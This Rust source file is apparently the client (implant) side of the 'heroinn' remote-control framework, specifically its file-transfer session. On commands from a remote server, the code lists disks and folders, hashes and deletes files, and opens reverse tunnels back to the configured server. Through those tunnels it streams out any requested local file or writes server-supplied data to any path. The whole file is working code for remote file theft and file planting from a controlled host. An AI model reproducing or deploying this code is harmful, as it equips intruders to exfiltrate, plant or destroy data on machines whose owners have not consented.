//! Client-side file-transfer session.
//!
//! The server drives this session with RPC calls (executed locally against the
//! file system) and with `Get`/`Put` requests that open a reverse tunnel.

use std::io::{Read, Seek, SeekFrom, Write};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{Arc, mpsc::Sender};

use heroinn_util::{
    Error, HeroinnProtocol, Result,
    ftp::{FTPGetHeader, FTPId, FTPPacket, FTPPutHeader, method::*},
    packet::TunnelRequest,
    protocol::Transport,
    rpc::{RpcMessage, RpcServer},
    session::{ClientSession, Session, SessionBase, SessionPacket},
};

use crate::config::master_configure;

/// A live file-transfer channel on the client side.
pub struct FtpClient {
    id: String,
    clientid: String,
    closed: Arc<AtomicBool>,
    rpc_server: RpcServer,
    sender: Sender<SessionBase>,
}

impl ClientSession for FtpClient {
    fn new_client(sender: Sender<SessionBase>, clientid: &str, id: &str) -> Result<Self> {
        let mut rpc_server = RpcServer::new();
        rpc_server.register("get_disk_info", get_disk_info);
        rpc_server.register("get_folder_info", get_folder_info);
        rpc_server.register("join_path", join_path);
        rpc_server.register("remove_file", remove_file);
        rpc_server.register("file_size", file_size);
        rpc_server.register("md5_file", md5_file);

        Ok(Self {
            id: id.to_string(),
            clientid: clientid.to_string(),
            closed: Arc::new(AtomicBool::new(false)),
            rpc_server,
            sender,
        })
    }
}

impl Session for FtpClient {
    fn id(&self) -> &str {
        &self.id
    }

    fn clientid(&self) -> &str {
        &self.clientid
    }

    fn write(&mut self, data: &[u8]) -> Result<()> {
        let packet = FTPPacket::parse(data)?;

        match packet.id()? {
            FTPId::RPC => {
                log::debug!("recv rpc call");
                let msg = RpcMessage::parse(&packet.data)?;
                let ret = self.rpc_server.call(&msg);

                let packet = FTPPacket {
                    id: FTPId::RPC.to_u8(),
                    data: ret.serialize()?,
                };

                let packet = SessionPacket {
                    id: self.id.clone(),
                    data: packet.serialize()?,
                };
                log::debug!("call ret : {:?}", ret);
                if let Err(e) = self.sender.send(SessionBase {
                    id: self.id.clone(),
                    clientid: self.clientid.clone(),
                    packet,
                }) {
                    log::error!("session sender error : {}", e);
                    self.closed.store(true, Ordering::Relaxed);
                };
            }
            FTPId::Get => {
                let request = TunnelRequest::parse(&packet.data)?;
                let closed = self.closed.clone();

                std::thread::spawn(move || upload_worker(request, closed));
            }
            FTPId::Put => {
                let request = TunnelRequest::parse(&packet.data)?;
                let closed = self.closed.clone();

                std::thread::spawn(move || download_worker(request, closed));
            }
            FTPId::Close => {
                self.close();
            }
        }

        Ok(())
    }

    fn alive(&self) -> bool {
        !self.closed.load(Ordering::Relaxed)
    }

    fn close(&mut self) {
        log::info!("ftp session closed");
        self.closed.store(true, Ordering::Relaxed);
    }
}

/// Open a tunnel back to the server and stream the requested file into it.
fn upload_worker(request: TunnelRequest, closed: Arc<AtomicBool>) {
    let mut tunnel = match open_tunnel(request.port) {
        Ok(p) => p,
        Err(e) => {
            log::error!("create tunnel failed : {}", e);
            return;
        }
    };
    log::debug!("create tunnel success");

    let header = match tunnel.recv() {
        Ok(p) => p,
        Err(e) => {
            log::error!("recv get header tunnel failed : {}", e);
            return;
        }
    };

    let header = FTPGetHeader::parse(&header).unwrap();

    let mut f = match std::fs::File::open(&header.path) {
        Ok(p) => p,
        Err(e) => {
            log::error!("open file failed : {}", e);
            return;
        }
    };

    if header.start_pos != 0
        && let Err(e) = f.seek(SeekFrom::Start(header.start_pos))
    {
        log::error!("seek file failed : {}", e);
        return;
    }

    log::debug!("start get transfer [{}]", header.path);
    loop {
        if closed.load(Ordering::Relaxed) {
            log::error!("session closed");
            break;
        }

        let mut buf = [0u8; 1024 * 20];
        let size = match f.read(&mut buf) {
            Ok(p) => p,
            Err(e) => {
                log::error!("read file failed : {}", e);
                break;
            }
        };

        if size == 0 {
            break;
        }

        log::debug!("send file data [{}]", size);
        if let Err(e) = tunnel.send(&buf[..size]) {
            log::error!("get worker send to server failed : {}", e);
            break;
        };
    }

    log::info!("get file worker finished");
}

/// Open a tunnel back to the server and write the received data into a file.
fn download_worker(request: TunnelRequest, closed: Arc<AtomicBool>) {
    let mut tunnel = match open_tunnel(request.port) {
        Ok(p) => p,
        Err(e) => {
            log::error!("create tunnel failed : {}", e);
            return;
        }
    };
    log::debug!("create tunnel success");

    let header = match tunnel.recv() {
        Ok(p) => p,
        Err(e) => {
            log::error!("recv put header failed : {}", e);
            return;
        }
    };

    let header = match FTPPutHeader::parse(&header) {
        Ok(p) => p,
        Err(e) => {
            log::error!("parse put header failed : {}", e);
            return;
        }
    };

    let mut f = if header.start_pos == 0 {
        match std::fs::File::create(&header.path) {
            Ok(p) => p,
            Err(e) => {
                log::error!("create remote file failed [{}] : {}", header.path, e);
                return;
            }
        }
    } else {
        let mut f = match std::fs::File::options().write(true).open(&header.path) {
            Ok(p) => p,
            Err(e) => {
                log::error!("open remote file failed [{}] : {}", header.path, e);
                return;
            }
        };

        if let Err(e) = f.seek(SeekFrom::Start(header.start_pos)) {
            log::error!("seek remote file failed [{}] : {}", header.path, e);
            return;
        }
        f
    };

    log::debug!("start put transfer [{}]", header.path);
    loop {
        if closed.load(Ordering::Relaxed) {
            log::error!("session closed");
            break;
        }

        let data = match tunnel.recv() {
            Ok(p) => p,
            Err(e) => {
                log::error!("recv data failed from ftp slave : {}", e);
                break;
            }
        };

        if data.is_empty() {
            break;
        }

        if let Err(e) = f.write_all(&data) {
            log::error!("write download file failed : {}", e);
            break;
        };
        log::debug!("recv transfer data [{}]", data.len());

        let pos = match f.stream_position() {
            Ok(p) => p,
            Err(e) => {
                log::error!("get localfile size failed : {}", e);
                break;
            }
        };

        if pos >= header.total_size {
            break;
        }
    }
}

/// Open a reverse tunnel back to the configured server.
fn open_tunnel(port: u16) -> Result<Transport> {
    let config = master_configure();
    let proto = HeroinnProtocol::try_from(config.protocol)
        .map_err(|e| Error::Other(format!("unknown protocol : {}", e)))?;

    Transport::tunnel(&proto, &config.address, port)
}
